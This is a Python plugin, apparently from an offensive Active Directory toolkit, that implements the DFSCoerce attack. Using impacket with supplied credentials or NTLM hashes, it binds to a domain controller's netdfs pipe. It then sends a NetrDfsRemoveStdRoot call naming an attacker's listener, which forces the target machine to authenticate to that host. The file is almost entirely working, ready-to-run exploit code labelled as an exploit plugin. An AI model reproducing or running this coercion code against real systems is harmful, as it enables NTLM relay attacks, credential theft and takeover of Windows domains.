import argparse
from copy import copy

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADDFSCoerce(PluginAdExploitBase):
    display = "MS-DFSNM 强制认证"
    alias = "dfs_coe"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-d", "--domain", help="target domain name (test.lab)", required=True, dest="domain")
        parser.add_argument("--username", help="username", required=True, dest="username")
        parser.add_argument("--password", help="password", required=True, dest="password")
        parser.add_argument("--target-ip", help="target ip address", required=True, dest="target_ip")
        parser.add_argument('--hash', help='NTLM hashes, format is LMHASH:NTHASH', required=False,
                            metavar="LMHASH:NTHASH", dest="hash")
        parser.add_argument("-l", "--listen", help="Mandatory authentication callback address", required=True,
                            dest="listen")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        _domain_name: str = args.domain
        _target_ip = args.target_ip
        _username = args.username
        _password = args.password
        _hash = args.hash
        _listener = args.listen

        if _hash is not None:
            lmhash, nthash = _hash.split(':')
        else:
            lmhash = ''
            nthash = ''

        trigger = TriggerAuth()

        dce = trigger.connect(username=_username, password=_password, domain=_domain_name,
                              lmhash=lmhash, nthash=nthash, target=_target_ip, doKerberos=False,
                              dcHost=None, targetIp=None)
        if dce is not None:
            trigger.NetrDfsRemoveStdRoot(dce, _listener)
            dce.disconnect()

        return result


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'DFSNM SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'DFSNM SessionError: unknown error code: 0x%x' % self.error_code


class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('ApiFlags', DWORD),
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class NetrDfsAddRoot(NDRCALL):
    opnum = 12
    structure = (
         ('ServerName',WSTR),
         ('RootShare',WSTR),
         ('Comment',WSTR),
         ('ApiFlags',DWORD),
     )
class NetrDfsAddRootResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )

class TriggerAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp):
        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netdfs]' % target)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)
        dce = rpctransport.get_dce_rpc()
        output.info("Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
        try:
            dce.connect()
        except Exception as e:
            output.error("Something went wrong, check error status => %s" % str(e))
            return

        try:
            dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
        except Exception as e:
            output.error("Something went wrong, check error status => %s" % str(e))
            return
        output.success("Successfully bound!")
        return dce

    def NetrDfsRemoveStdRoot(self, dce, listener):
        output.info("Sending NetrDfsRemoveStdRoot!")
        try:
            request = NetrDfsRemoveStdRoot()
            request['ServerName'] = '%s\x00' % listener
            request['RootShare'] = 'test\x00'
            request['ApiFlags'] = 1
            output.debug(f"NetrDfsRemoveStdRoot:\n"
                         f"{'':^8}Servername: {(request.fields['ServerName'].fields['Data']).decode('utf-16')}\n"
                         f"{'':^8}RootShare:  {(request.fields['RootShare'].fields['Data']).decode('utf-16')}\n"
                         f"{'':^8}ApiFlags:   {(request.fields['ApiFlags'].fields['Data'])}\n")
            resp = dce.request(request)

        except  Exception as e:
            output.error(e)